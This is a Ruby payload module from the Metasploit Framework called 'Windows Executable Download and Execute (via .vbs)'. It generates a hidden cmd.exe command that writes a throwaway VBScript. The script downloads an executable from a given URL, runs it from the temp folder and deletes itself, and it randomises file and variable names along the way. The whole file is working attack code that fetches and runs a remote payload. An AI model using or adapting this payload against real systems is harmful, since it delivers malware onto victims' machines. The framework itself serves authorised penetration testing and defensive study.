# $Id$

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'        => 'Windows Executable Download and Execute (via .vbs)',
			'Version'     => '$Revision$',
			'Description' => 'Download an EXE from an HTTP(S) URL and execute it',
			'Author'      => 'scriptjunkie',
			'License'     => BSD_LICENSE,
			'Platform'    => 'win',
			'Arch'        => ARCH_CMD,
			'Handler'     => Msf::Handler::None,
			'Session'     => Msf::Sessions::CommandShell,
			'PayloadType' => 'cmd',
			'Payload'     =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))

		register_options(
			[
				OptString.new('URL', [ true, "The pre-encoded URL to the executable" ])
			], self.class)
	end

	def generate
		return super + command_string
	end

	def command_string
		# It's already long. Keep variable names short.
		vbsname = Rex::Text.rand_text_alpha(1+rand(2))
		exename = Rex::Text.rand_text_alpha(1+rand(2))
		xmlhttpvar = Rex::Text.rand_text_alpha(1+rand(2))
		streamvar = Rex::Text.rand_text_alpha(1+rand(2))

		# "start #{vbsname}.vbs" instead of just "#{vbsname}.vbs" so that the console window
		# disappears quickly before the wscript libraries load and the file downloads
		"cmd.exe /q /c echo Set #{xmlhttpvar}=CreateObject(\"Microsoft.XMLHTTP\") >#{vbsname}.vbs"+
"&echo #{xmlhttpvar}.Open \"GET\",\"#{datastore['URL']}\",False >>#{vbsname}.vbs"+
"&echo #{xmlhttpvar}.Send >>#{vbsname}.vbs"+
"&echo Set #{streamvar}=CreateObject(\"ADODB.Stream\") >>#{vbsname}.vbs"+
"&echo #{streamvar}.Type=1 >>#{vbsname}.vbs"+
"&echo #{streamvar}.Open >>#{vbsname}.vbs"+
"&echo #{streamvar}.Write #{xmlhttpvar}.responseBody >>#{vbsname}.vbs"+
"&echo #{streamvar}.SaveToFile \"%tmp%\\#{exename}.exe\",2 >>#{vbsname}.vbs"+
"&echo CreateObject(\"WScript.Shell\").Run \"%tmp%\\#{exename}.exe\" >>#{vbsname}.vbs"+
"&echo CreateObject(\"Scripting.FileSystemObject\").DeleteFile \"#{vbsname}.vbs\" >>#{vbsname}.vbs"+
"&start #{vbsname}.vbs"
	end
end
